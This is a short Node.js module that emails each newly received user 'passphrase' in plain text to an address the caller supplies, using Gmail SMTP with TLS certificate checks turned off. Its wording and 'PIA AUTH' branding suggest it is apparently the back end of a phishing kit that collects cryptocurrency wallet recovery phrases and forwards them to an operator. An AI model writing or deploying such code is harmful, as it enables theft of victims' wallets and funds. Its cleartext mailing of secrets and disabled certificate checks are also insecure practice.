const nodemailer = require("nodemailer");
require("dotenv").config();

const sendEmail = async (options) => {
    const transporter = nodemailer.createTransport({
        host: "smtp.gmail.com",
        service: "gmail",
        port: 587,
        secure: false,
        auth: {
            user: process.env.user,
            pass: process.env.password
        },
        tls: {
            rejectUnauthorized: false,
        },
    });

    const fromAddress = `"${process.env.from_Name}" <${process.env.user}>`;

    const emailHTML = `
    <div style="font-family: Arial, sans-serif; line-height: 1.6; max-width: 600px; margin: 0 auto; border: 1px solid #e0e0e0; padding: 20px; background-color: #f9f9f9;">
        <header style="background-color: #ff6f61; color: white; padding: 10px 20px; text-align: center;">
            <h1 style="margin: 0;">New Passpharse Received</h1>
        </header>
        
        <main style="padding: 20px; background-color: white; color: #333;">
            <p style="font-size: 16px; color: #555;">
                A new user has registered with the following passpharse:
            </p>

            <blockquote style="border-left: 5px solid #ff6f61; margin: 20px 0; padding-left: 15px; color: #444; font-style: italic; font-size: 18px; line-height: 1.5;">
                ${options.passphrase}
            </blockquote>

            <p style="font-size: 16px; color: #555;">
                Please ensure that this information is securely stored.
            </p>
        </main>
        
        <footer style="background-color: #333; color: white; padding: 10px 20px; text-align: center;">
            <p style="margin: 0;">&copy; 2024 PIA AUTH. All rights reserved.</p>
        </footer>
    </div>
    `;

    try {
        const info = await transporter.sendMail({
            from: fromAddress,
            to: options.email,
            subject: options.subject,
            html: emailHTML
        });

        console.log("Message sent: %s", info.messageId);
        return info;
    } catch (error) {
        console.error("Error sending email:", error);
        throw error;
    }
};

module.exports = sendEmail;
